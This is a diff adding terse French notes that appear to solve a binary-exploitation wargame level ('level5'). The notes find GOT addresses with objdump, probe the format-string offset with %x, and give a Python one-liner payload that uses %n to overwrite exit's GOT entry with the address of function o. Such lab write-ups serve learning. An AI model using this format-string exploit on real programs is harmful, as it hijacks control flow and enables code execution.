@@ -1,0 +1,13 @@
+trouver adresse de o et exit
+
+objdump -R level5 | grep exit
+
+remplacer l adresse d exit par celle de o
+
+en la trouvant avec echo "BBBB %x %x %x %x %x %x" | ./level5
+
+c la  4 eme
+
+python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/payload5
+
+cat /tmp/payload5 - | ./level5
